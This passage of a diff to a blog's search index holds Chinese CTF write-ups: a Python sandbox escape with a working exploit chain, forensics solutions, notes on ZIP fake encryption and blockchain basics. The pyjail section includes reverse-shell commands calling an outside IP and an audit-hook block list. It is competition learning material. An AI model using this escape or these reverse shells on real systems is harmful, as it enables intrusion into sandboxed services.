Handler(socketserver.BaseRequestHandler):    def handle(self):        self.request.sendall(b&quot;Welcome to Interactive Pyjail!\n&quot;)        self.request.sendall(b&quot;Rules: No import / No sleep / No input\n\n&quot;)        try:            self.request.sendall(b&quot;========= Server Source Code =========\n&quot;)            self.request.sendall(source_code.encode() + b&quot;\n&quot;)            self.request.sendall(b&quot;========= End of Source Code =========\n\n&quot;)        except Exception as e:            self.request.sendall(b&quot;Failed to load source code.\n&quot;)            self.request.sendall(str(e).encode() + b&quot;\n&quot;)        self.request.sendall(b&quot;Type your code line by line. Type &#x27;exit&#x27; to quit.\n\n&quot;)        prefix_code = CODE        sandbox_globals = None        while True:            self.request.sendall(b&quot;&gt;&gt;&gt; &quot;)            try:                user_input = self.request.recv(4096).decode().strip()                if not user_input:                    continue                if user_input.lower() == &quot;exit&quot;:                    self.request.sendall(b&quot;Bye!\n&quot;)                    break                if len(user_input) &gt; 100:                    self.request.sendall(b&quot;Input too long (max 100 chars)!\n&quot;)                    continue                full_code = prefix_code + user_input + &quot;\n&quot;                prefix_code = &quot;&quot;                result, sandbox_globals = safe_exec(full_code, sandbox_globals)                self.request.sendall(result.encode() + b&quot;\n&quot;)            except Exception as e:                self.request.sendall(f&quot;Error occurred: &#123;str(e)&#125;\n&quot;.encode())                breakif __name__ == &quot;__main__&quot;:    HOST, PORT = &quot;0.0.0.0&quot;, 5000    with socketserver.ThreadingTCPServer((HOST, PORT), Handler) as server:        print(f&quot;Server listening on &#123;HOST&#125;:&#123;PORT&#125;&quot;)        server.serve_forever()
+
+省流:
+def my_audit_checker(event, args):    blocked_events = [        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;    ]    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)addaudithook(my_audit_checker)
+
+就是要在这个钩子的限制下逃逸并且限制能用的东西只有如下
+&quot;__builtins__&quot;: &#123;                &quot;print&quot;: print,                &quot;any&quot;: any,                &quot;len&quot;: len,                &quot;RuntimeError&quot;: RuntimeError,                &quot;addaudithook&quot;: sys.addaudithook,                &quot;original_stdout&quot;: original_stdout,                &quot;original_stderr&quot;: original_stderr                &#125;
+
+并且有提示No import / No sleep / No input
+还ban掉了类似ssti向下找的方法
+
+
+1.ban了关键字&#x27;__&#x27;2.
+
+看了眼，知道是栈帧逃逸
+打一个大致的poc
+a=(a.gi_frame.f_back.f_back for i in [2]);a=[x for x in a][0]b = a.f_back.f_globals[&#x27;sys&#x27;]os = b.modules.get(&#x27;os&#x27;)
+
+这边其实蛮犹豫要不要用os打的
+但是其他模块其实也没什么可以利用的
+#sys下的模块&#123;&#x27;sys&#x27;: &lt;module &#x27;sys&#x27; (built-in)&gt;,  &#x27;builtins&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;_frozen_importlib&#x27;: &lt;module &#x27;_frozen_importlib&#x27; (frozen)&gt;,  &#x27;_imp&#x27;: &lt;module &#x27;_imp&#x27; (built-in)&gt;, &#x27;_thread&#x27;: &lt;module &#x27;_thread&#x27; (built-in)&gt;, &#x27;_warnings&#x27;: &lt;module &#x27;_warnings&#x27; (built-in)&gt;, &#x27;_weakref&#x27;: &lt;module &#x27;_weakref&#x27; (built-in)&gt;, &#x27;_io&#x27;: &lt;module &#x27;_io&#x27; (built-in)&gt;,  &#x27;marshal&#x27;: &lt;module &#x27;marshal&#x27; (built-in)&gt;, &#x27;posix&#x27;: &lt;module &#x27;posix&#x27; (built-in)&gt;,  &#x27;_frozen_importlib_external&#x27;: &lt;module &#x27;_frozen_importlib_external&#x27; (frozen)&gt;,  &#x27;time&#x27;: &lt;module &#x27;time&#x27; (built-in)&gt;, &#x27;zipimport&#x27;: &lt;module &#x27;zipimport&#x27; (frozen)&gt;,  &#x27;_codecs&#x27;: &lt;module &#x27;_codecs&#x27; (built-in)&gt;, &#x27;codecs&#x27;: &lt;module &#x27;codecs&#x27; (frozen)&gt;, &#x27;encodings.aliases&#x27;: &lt;module &#x27;encodings.aliases&#x27; from &#x27;/usr/local/lib/python3.11/encodings/aliases.py&#x27;&gt;,  &#x27;encodings&#x27;: &lt;module &#x27;encodings&#x27; from &#x27;/usr/local/lib/python3.11/encodings/__init__.py&#x27;&gt;, &#x27;encodings.utf_8&#x27;: &lt;module &#x27;encodings.utf_8&#x27; from &#x27;/usr/local/lib/python3.11/encodings/utf_8.py&#x27;&gt;,  &#x27;_signal&#x27;: &lt;module &#x27;_signal&#x27; (built-in)&gt;, &#x27;_abc&#x27;: &lt;module &#x27;_abc&#x27; (built-in)&gt;,  &#x27;abc&#x27;: &lt;module &#x27;abc&#x27; (frozen)&gt;,  &#x27;io&#x27;: &lt;module &#x27;io&#x27; (frozen)&gt;,  &#x27;__main__&#x27;: &lt;module &#x27;__main__&#x27; from &#x27;/app/app.py&#x27;&gt;,  &#x27;_stat&#x27;: &lt;module &#x27;_stat&#x27; (built-in)&gt;,  &#x27;stat&#x27;: &lt;module &#x27;stat&#x27; (frozen)&gt;,  &#x27;_collections_abc&#x27;: &lt;module &#x27;_collections_abc&#x27; (frozen)&gt;,  &#x27;genericpath&#x27;: &lt;module &#x27;genericpath&#x27; (frozen)&gt;,  &#x27;posixpath&#x27;: &lt;module &#x27;posixpath&#x27; (frozen)&gt;,  &#x27;os.path&#x27;: &lt;module &#x27;posixpath&#x27; (frozen)&gt;,  &#x27;os&#x27;: &lt;module &#x27;os&#x27; (frozen)&gt;,  &#x27;_sitebuiltins&#x27;: &lt;module &#x27;_sitebuiltins&#x27; (frozen)&gt;,  &#x27;_distutils_hack&#x27;: &lt;module &#x27;_distutils_hack&#x27; from &#x27;/usr/local/lib/python3.11/site-packages/_distutils_hack/__init__.py&#x27;&gt;,  &#x27;site&#x27;: &lt;module &#x27;site&#x27; (frozen)&gt;,  &#x27;_socket&#x27;: &lt;module &#x27;_socket&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/_socket.cpython-311-x86_64-linux-musl.so&#x27;&gt;,  &#x27;itertools&#x27;: &lt;module &#x27;itertools&#x27; (built-in)&gt;,  &#x27;keyword&#x27;: &lt;module &#x27;keyword&#x27; from &#x27;/usr/local/lib/python3.11/keyword.py&#x27;&gt;,  &#x27;_operator&#x27;: &lt;module &#x27;_operator&#x27; (built-in)&gt;,  &#x27;operator&#x27;: &lt;module &#x27;operator&#x27; from &#x27;/usr/local/lib/python3.11/operator.py&#x27;&gt;,  &#x27;reprlib&#x27;: &lt;module &#x27;reprlib&#x27; from &#x27;/usr/local/lib/python3.11/reprlib.py&#x27;&gt;,  &#x27;_collections&#x27;: &lt;module &#x27;_collections&#x27; (built-in)&gt;,  &#x27;collections&#x27;: &lt;module &#x27;collections&#x27; from &#x27;/usr/local/lib/python3.11/collections/__init__.py&#x27;&gt;,  &#x27;collections.abc&#x27;: &lt;module &#x27;collections.abc&#x27; from &#x27;/usr/local/lib/python3.11/collections/abc.py&#x27;&gt;,  &#x27;math&#x27;: &lt;module &#x27;math&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/math.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;select&#x27;: &lt;module &#x27;select&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/select.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;selectors&#x27;: &lt;module &#x27;selectors&#x27; from &#x27;/usr/local/lib/python3.11/selectors.py&#x27;&gt;,  &#x27;types&#x27;: &lt;module &#x27;types&#x27; from &#x27;/usr/local/lib/python3.11/types.py&#x27;&gt;,  &#x27;_functools&#x27;: &lt;module &#x27;_functools&#x27; (built-in)&gt;,  &#x27;functools&#x27;: &lt;module &#x27;functools&#x27; from &#x27;/usr/local/lib/python3.11/functools.py&#x27;&gt;,  &#x27;enum&#x27;: &lt;module &#x27;enum&#x27; from &#x27;/usr/local/lib/python3.11/enum.py&#x27;&gt;,  &#x27;errno&#x27;: &lt;module &#x27;errno&#x27; (built-in)&gt;,  &#x27;array&#x27;: &lt;module &#x27;array&#x27; from &#x27;/usr/local/lib/python3.11/lib-dynload/array.cpython-311-x86_64-linux-musl.so&#x27;&gt;, &#x27;socket&#x27;: &lt;module &#x27;socket&#x27; from &#x27;/usr/local/lib/python3.11/socket.py&#x27;&gt;,  &#x27;_weakrefset&#x27;: &lt;module &#x27;_weakrefset&#x27; from &#x27;/usr/local/lib/python3.11/_weakrefset.py&#x27;&gt;,  &#x27;threading&#x27;: &lt;module &#x27;threading&#x27; from &#x27;/usr/local/lib/python3.11/threading.py&#x27;&gt;,  &#x27;socketserver&#x27;: &lt;module &#x27;socketserver&#x27; from &#x27;/usr/local/lib/python3.11/socketserver.py&#x27;&gt;,  &#x27;_ast&#x27;: &lt;module &#x27;_ast&#x27; (built-in)&gt;,  &#x27;contextlib&#x27;: &lt;module &#x27;contextlib&#x27; from &#x27;/usr/local/lib/python3.11/contextlib.py&#x27;&gt;,  &#x27;ast&#x27;: &lt;module &#x27;ast&#x27; from &#x27;/usr/local/lib/python3.11/ast.py&#x27;&gt;&#125;
+
+接着用
+print(os.listdir(&#x27;/&#x27;))
+
+看到了这个
+
+
+接着就有点迷糊不知道怎么读取了
+因为open和system这些能利用的都被ban了
+r, w = os.pipe()pid = os.fork()os.close(r); os.dup2(w, 1);os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, f&#x27;cat /flag.txt&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 4096); print(data.decode())
+
+
+看来需要根据时间来查一下
+替换一下为os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find / -mtime 1 -print&#x27;]); 
+
+
+
+大概找到路径了
+但是问题来了
+在这样的路径下怎么读取呢?
+一般说，这样的路径用linux执行是会被转义的
+而在python中也拒绝\x0a这类的出现
+然后有一个递归读取的东西
+完整poc:
+a=(a.gi_frame.f_back.f_back for i in [2]);a=[x for x in a][0]b = a.f_back.f_globals[&#x27;sys&#x27;]os = b.modules.get(&#x27;os&#x27;)r, w = os.pipe()pid = os.fork()os.close(r); os.dup2(w, 1);os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;ls -la&#x27;]); os._exit(0)#os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, f&#x27;wc -c &#123;path&#125;&#x27;]); os._exit(0)os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find /tmp -type f -exec cat &#123;&#125; \\;&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 512); print(data.decode())os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;find /tmp/.\\x0a\\x0b\\x00hidden/ -mtime 1 -print&#x27;]); find / -mtime 1 -printos.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;busybox nc 111.229.205.196 9001 -e sh&#x27;]); os._exit(0)os.execv(&#x27;/bin/sh&#x27;, [&#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh -i &gt;&amp; /dev/tcp/111.229.205.196/9001 0&gt;&amp;1&#x27;]); os._exit(0)os.close(w); os.waitpid(pid, 0); data = os.read(r, 4096); print(data.decode())//缓冲区太大
+
+中间是有一个小插曲的
+就是他的那个目录下
+哈哈一点都不好笑
+而且缓存区开太大靶机会直接死机
+中间一段直接红温了
+好在最后还是出了，拿了3血，www
+MiniForensicsⅠ看到桌面上有个“没什么用的b.txt”
+看题目描述说bitlocker恢复密钥传到了服务器上，我们直接查看桌面上流量就好
+在流量里发现
+
+
+接着往下翻就能看到恢复密钥了
+
+
+521433-074470-317097-543499-149259-301488-189849-252032
+
+然后我们把加密的d盘使用取证大师挂载一下（或者直接虚拟机打开也行）
+bitlocker解密一下
+在d盘里发现一个c.txt
+由于是画图，我们直接使用脚本
+这里先把c的图画了
+import matplotlib.pyplot as plt# 坐标数据（x, y）data_str = &quot;&quot;&quot;#数据填写处&quot;&quot;&quot;# 解析坐标points = [tuple(map(float, pair.split(&#x27;,&#x27;))) for pair in data_str.split()]x_vals, y_vals = zip(*points)# 创建图像plt.figure(figsize=(10, 6))  # 拉长纵向显示plt.plot(x_vals, y_vals, marker=&#x27;o&#x27;, linestyle=&#x27;-&#x27;)plt.title(&quot;坐标点折线图&quot;)plt.xlabel(&quot;X&quot;)plt.ylabel(&quot;Y&quot;)plt.grid(True)# 设置y轴范围，使其上下拉伸（例如以中心为215，上下扩展±5）plt.ylim(min(y_vals) - 5, max(y_vals) + 5)plt.tight_layout()plt.show()
+
+画了c的图发现是反转的
+反转回来：
+
+
+发现是fake_flag，但是提醒我们计算a.txt，使用脚本：
+# 读取文件并解析为二维浮点列表def read_coords(filename):    with open(filename, &#x27;r&#x27;) as f:        lines = f.readlines()    coords = [tuple(map(float, line.strip().split(&#x27;,&#x27;))) for line in lines if line.strip()]    return coords# 写入结果到 a.txtdef write_coords(filename, coords):    with open(filename, &#x27;w&#x27;) as f:        for x, y in coords:            f.write(f&quot;&#123;x&#125;,&#123;y&#125;\n&quot;)# 主逻辑b_coords = read_coords(&#x27;b.txt&#x27;)c_coords = read_coords(&#x27;c.txt&#x27;)# 取最短长度，避免索引越界min_len = min(len(b_coords), len(c_coords))if len(b_coords) != len(c_coords):    print(f&quot;警告：b.txt 和 c.txt 的行数不一致，仅处理前 &#123;min_len&#125; 行&quot;)# 计算 a = 2b - ca_coords = [    (2 * bx - cx, 2 * by - cy)    for (bx, by), (cx, cy) in zip(b_coords[:min_len], c_coords[:min_len])]# 保存结果write_coords(&#x27;a.txt&#x27;, a_coords)print(&quot;a.txt 已成功生成！&quot;)
+
+然后再利用画图脚本画出a.txt：
+
+
+反转一下看到flag：
+
+
+flag：miniLCTF{forens1c5_s0ooooo_1nt4resting}
+MiniForensicsⅡ我们打开取证，在C盘的user下的document里发现nihao的文件夹
+里面是一个pwd.txt和压缩包，pwd提醒我们密码是7位数字，爆破得到密码是：1846287
+
+
+我们使用winrar解压得到sslkeylog文件。
+在桌面上发现有pcapng文件，ssl解密，http流量里发现一个压缩包
+保存下来发现里面有useless.png和一个txt
+我们使用png文件头爆破得到三串密钥：45797e52 f747cc4c 800bd117
+
+
+导出，得到txt里面内容：
+aHR0cHM6Ly9naXRodWIuY29tL3Jvb3QtYWRtaW4tdXNlci93aGF0X2RvX3lvdV93YW5uYV9maW5kLmdpdA==
+
+也就是指向了这个地址：https://github.com/root-admin-user/what_do_you_wanna_find.git
+访问，在脚本里发现一串哈希值：89045a3653af483b6bb390e27c10db16873a60d1
+脚本里面提示我们historical commits
+直接访问Add files via upload · root-admin-user&#x2F;what_do_you_wanna_find@89045a3
+发现隐藏内容，发现是代码混淆，发现flag。
+flag：miniLCTF{c0ngr4tul4ti0n5_70u’v3_g0t_th3_s3cr3ts}
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>WP</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>关于ZIP伪加密</title>
+    <url>/2025/02/%E5%85%B3%E4%BA%8EZIP%E4%BC%AA%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[ZIP伪加密看似简单，实则也是大有学问在里面
+这里细节讲解一下伪加密和相关工具的使用
+首先我们需要了解一下zip文件结构
+zip文件结构zip文件结构大致分为三个部分
+一个record区，一个dirEntry区，一个endLocator区
+三个部分相互依存，这里是010下的zip文件对照表
++ ZIPFILERECORD record # 压缩源文件数据区    - char frSignature[4] # 压缩源文件标志    - ushort frVersion # 压缩源文件版本    - ushort frFlags # 压缩源文件标志 （有无加密，偶数位修改了最低位所以会显示有密码）    - enum COMPTYPE frCompression    - DOSTIME frFileTime # 压缩源文件时间    - DOSDATE frFileDate # 压缩源文件日期    - uint frCrc # 压缩源文件CRC32校验值    - uint frCompressedSize # 压缩源文件压缩后大小    - uint frUncompressedSize # 压缩源文件压缩前大小    - ushort frFileNameLength # 压缩源文件名长度    - ushort frExtraFieldLength # 压缩源文件扩展域长度    - char frFileName[frFileNameLength] # 压缩源文件名    - uchar frData[frCompressedSize] # 压缩源文件数据+ ZIPDIRENTRY dirEntry # 压缩源文件目录区    - char deSignature[4] # 目录标志    - ushort deVersionMadeBy # 创建该条目的版本    - ushort deVersionNeeded # 解压该条目所需的版本    - ushort deFlags # 标志位 （有无加密，偶数位修改了最低位所以会显示有密码）    - enum COMPTYPE deCompression # 压缩方法    - DOSTIME deFileTime # 最后修改时间    - DOSDATE deFileDate # 最后修改日期    - uint deCrc # CRC32校验值    - uint deCompressedSize # 压缩后的大小    - uint deUncompressedSize # 压缩前的大小    - ushort deFileNameLength # 文件名长度    - ushort deExtraFieldLength # 扩展域长度    - ushort deFileCommentLength # 文件评论长度    - ushort deDiskNumberStart # 起始磁盘编号    - ushort deInternalAttributes # 内部属性    - uint deExternalAttributes # 外部属性    - uint deRelativeOffset # 该条目在 ZIP 文件中的偏移位置    - char deFileName[deFileNameLength] # 文件名    - char deExtraField[deExtraFieldLength] # 扩展域    - char deFileComment[deFileCommentLength] # 文件评论+ ZIPENDLOCATOR endLocator # 压缩源文件目录结束标志    - char elSignature[4] # 结束标志    - ushort elDiskNumber # 当前磁盘编号    - ushort elStartDiskNumber # 目录开始的磁盘编号    - ushort elEntriesOnDisk # 当前磁盘上的条目数量    - ushort elEntriesTotal # 总条目数量    - uint elSizeOfDirectory # 目录的总大小    - uint elOffsetOfDirectory # 目录开始的偏移位置    - ushort elCommentLength # 注释长度    - char elComment[elCommentLength] # 注释
+
+可以发现最重要的就是两个标志位了，他们是判断伪加密的标准
+其实其余部分也很重要，因为如果不对应的话直接解压会发现报错——CRC校验错误
+首先我们要知道
+
+全局方式位标记的四个数字中只有第二个数字对其有影响，其它的不管为何值，都不影响它的加密属性，即：                                             第二个数字为奇数时 –&gt;加密                                             第二个数字为偶数时 –&gt;未加密
+
+也就是说，0900&#x2F;0100代表着加密，0000&#x2F;0800代表着无加密
+而伪加密就是把本来无加密的文件修改了标志位从而显示出加密的样子
+那我们怎么修改伪加密呢？为什么有些工具可以直接解压有些却不行呢？
+工具选择010editor010editor肯定是最普遍和最准确的修改伪加密的东西了
+如果是伪加密的话直接010修改0900为0000
+如果两区（record和dirEntry）都是0900直接全改即可
+bandizip经过测试，bandizip识别一个文件是否加密是通过看dirEntry记录中的deflag位
+如果deFlag位是加密的话无论另一个frflag是否是加密bandizip都会识别为加密
+winRARwinRAR和bandizip一样，都是识别dirEntry记录中的deflag位
+7zip7z就很神奇，它与上面两个工具不同。
+7zip判断是否为加密的方式是看record记录中的frflag位
+因此有些明明是伪加密的zip 7z却能直接解压
+所以那句“不会出的出题人只修改一个struct区”是因为换个工具就能解压
+随波逐流经过测试，随波逐流提供的伪加密修复只会修改dirEntry记录中的deflag位，而不管frFlag位
+ZipCenOp不好用！！
+运行
+java -jar ZipCenOp.jar -r 111.zip
+
+会显示
+success 1 flag(s) found
+但是它不帮我改，有啥用？。。
+其他工具传闻2345好压改两个区也能直接开。而且还有360解压缩
+然而我不敢尝试，怕删不干净。。
+细节注意zip伪加密还有一个细节需要注意的是我们都知道两个flag位置改成奇数时加密，偶数时无加密
+那改成奇数时0100和0900有什么区别，能不能乱改？？
+答案是否定的。
+
+8神提供的解释：
+这两字节就叫Flags，010模板中写fr和de是为区分filerecord块和direntry块。Flags两字节一共16bit，只有最低位用于记录加密与否，倒数第2 3两个bit记录压缩选项，大部分情况下修改不会出现问题，但如果将这两字节修改为09的话就会修改倒数第4个bit：记录数据描述符，如果这个bit是1，则表示标头中的CRC32和文件大小未知，但它们的实际数据会以额外的12或16字节结构出现在压缩数据后面。把一个实际上没有数据描述符的压缩包的flags倒数第4个bit改成1会导致软件被指示去读取一个不存在的描述符片段，从而导致后续的数据读取全部错乱，进而解压失败。
+
+感觉实际情况的时候无法很明确的判断是改成0900还是0100，建议两种都试试，那种对了就用哪种
+flag通用位置位详解pkware.cachefly.net&#x2F;webdocs&#x2F;casestudies&#x2F;APPNOTE.TXT
+这是zip结构的格式规范。
+根据zip文件规范，flag位置有16个字节，每个字节都有不同的含义：
+
+
+
+位（从右往左）
+详细描述
+
+
+
+0
+如果设置，表示文件已加密。（flag是奇数的话就会使这一位为1，显示为加密）
+
+
+1
+对于压缩方法6（Imploding），表示使用8K滑动字典（否则为4K）。对于方法8和9（Deflate），与位1结合表示压缩选项。
+
+
+2
+对于方法6（Imploding），表示使用3个Shannon-Fano树（否则为2个）。对于方法8和9，结合位1表示压缩选项。
+
+
+3
+如果设置，CRC-32、压缩大小和未压缩大小在本地文件头中为零，实际值在数据描述符中。（即表示标头的CRC32和文件大小未知，读取数据时）
+
+
+4
+保留用于方法8（Deflate）的增强功能。
+
+
+5
+如果设置，表示文件包含压缩后的补丁数据（需要PKZIP 2.70或更高版本）。
+
+
+6
+强加密。如果设置，提取所需版本号至少为50，且位0必须设置。对于AES加密，版本号至少为51。
+
+
+7
+目前未使用。
+
+
+8
+目前未使用。
+
+
+9
+目前未使用。
+
+
+10
+目前未使用。
+
+
+11
+语言编码标志（EFS）。如果设置，文件名和注释字段必须使用UTF-8编码（见附录D）。
+
+
+12
+保留用于PKWARE的增强压缩。
+
+
+13
+如果设置，表示中央目录已加密，本地文件头中的某些字段被掩码。
+
+
+14
+保留用于PKWARE的替代流。
+
+
+15
+保留用于PKWARE。
+
+
+那么0900和0100有什么区别呢？
+已知在 010editor 使用了小端字节序，所以0900实际上也就是0x0009
+（什么是小端字节序？）
+拆分成二进制也就是
+0000 0000 0000 1001
+
+所以它修改了第0位和第3位，相对的，0100也就只修改了第0位
+第0位代表着加密与否，所以0900和0100都代表着zip加密了
+而0900比0100多修改了第三位，表示CRC-32、压缩大小和未压缩大小在本地文件头中为零，实际值在数据描述符中。
+也就是8神所说的“表示标头中的CRC32和文件大小未知”，所以乱修改的话读取会错乱。
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>区块链Blockchain学习</title>
+    <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[怎么现在的misc区块链内容越来越多了，不得不学了
+什么是区块链？区块链（英语：blockchain或block chain）是借由密码学与共识机制等技术建立与存储庞大交易资料链的点对点网络系统。
+从字面上看：区块链是由一个个记录着各种信息的小区块链接起来组成的一个链条，类似于我们将一块块砖头叠起来，而且叠起来后是没办法拆掉的，每个砖头上面还写着各种信息，包括：谁叠的，什么时候叠的，砖头用了什么材质等等，这些信息你也没办法修改。
+从计算机上看：区块链是一种比较特殊的分布式数据库。分布式数据库就是将数据信息单独放在每台计算机，且存储的信息的一致的，如果有一两台计算机坏掉了，信息也不会丢失，你还可以在其他计算机上查看到。
+区块链是一种分布式的，所以它是没有中心点的，信息存储在所有加入到区块链网络的节点当中，节点的数据是同步的。节点可以是一台服务器，笔记本电脑，手机等。
+有没一两句话能说明白区块链的？
+有的。
+麻将作为中国传统的区块链项目，四个矿工一组，先碰撞出13个数字正确哈希值的矿工可以获得记账权并得到奖励。
+基本名词&amp;&amp;工具使用钱包顾名思义就是存储钱的钱包
+这里推荐使用MetaMask，chrome浏览器上的一个插件。
+
+
+应该也可以使用 imtoken ，手机上的钱包
+注意每个钱包有一个地址，是收款的地址。而且注册账号时会让你记一些助记词，用来在忘记密码（私钥）的时候找回密码或钱包。
+切换网络
+在写CTF题目时候可以看比赛题目部署在哪个网路上，可以点击metamask左上角切换网络
+
+
+这个主要看比赛的网路。
+如何获取以太币？主要有一些水龙头可以每日拿一点，网上可以搜到
+1.ZAN Faucet - Get Ethereum Testnet and Solana Devnet Tokens
+2.Ethereum Sepolia Faucet
+助记词助记词是从建立账户的时候自动生成的，一般是12个或者24个，用来帮助找回密码。
+但是助记词并不是随机生成的，而是有一定的规律的，而且助记词是有范围的，一共2048个
+这里是所有2048个助记词（英文）： bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips
+如果从题目中拿到的一些助记词可以从这里缩小范围。
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Blockchain</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Blockchain</tag>
       </tags>
   </entry>
   <entry>
@@ -4832,45 +4871,6 @@ flag：SICTF{88a39373-e204-43b6-b321-33ac8972fde9}
       <tags>
         <tag>philosophy</tag>
         <tag>Wittgenstein</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>区块链Blockchain学习</title>
-    <url>/2025/02/%E5%8C%BA%E5%9D%97%E9%93%BEBlockchain%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[怎么现在的misc区块链内容越来越多了，不得不学了
-什么是区块链？区块链（英语：blockchain或block chain）是借由密码学与共识机制等技术建立与存储庞大交易资料链的点对点网络系统。
-从字面上看：区块链是由一个个记录着各种信息的小区块链接起来组成的一个链条，类似于我们将一块块砖头叠起来，而且叠起来后是没办法拆掉的，每个砖头上面还写着各种信息，包括：谁叠的，什么时候叠的，砖头用了什么材质等等，这些信息你也没办法修改。
-从计算机上看：区块链是一种比较特殊的分布式数据库。分布式数据库就是将数据信息单独放在每台计算机，且存储的信息的一致的，如果有一两台计算机坏掉了，信息也不会丢失，你还可以在其他计算机上查看到。
-区块链是一种分布式的，所以它是没有中心点的，信息存储在所有加入到区块链网络的节点当中，节点的数据是同步的。节点可以是一台服务器，笔记本电脑，手机等。
-有没一两句话能说明白区块链的？
-有的。
-麻将作为中国传统的区块链项目，四个矿工一组，先碰撞出13个数字正确哈希值的矿工可以获得记账权并得到奖励。
-基本名词&amp;&amp;工具使用钱包顾名思义就是存储钱的钱包
-这里推荐使用MetaMask，chrome浏览器上的一个插件。
-
-
-应该也可以使用 imtoken ，手机上的钱包
-注意每个钱包有一个地址，是收款的地址。而且注册账号时会让你记一些助记词，用来在忘记密码（私钥）的时候找回密码或钱包。
-切换网络
-在写CTF题目时候可以看比赛题目部署在哪个网路上，可以点击metamask左上角切换网络
-
-
-这个主要看比赛的网路。
-如何获取以太币？主要有一些水龙头可以每日拿一点，网上可以搜到
-1.ZAN Faucet - Get Ethereum Testnet and Solana Devnet Tokens
-2.Ethereum Sepolia Faucet
-助记词助记词是从建立账户的时候自动生成的，一般是12个或者24个，用来帮助找回密码。
-但是助记词并不是随机生成的，而是有一定的规律的，而且助记词是有范围的，一共2048个
-这里是所有2048个助记词（英文）： bips&#x2F;bip-0039&#x2F;english.txt at master · bitcoin&#x2F;bips
-如果从题目中拿到的一些助记词可以从这里缩小范围。
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>Blockchain</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>Blockchain</tag>
       </tags>
   </entry>
 </search>
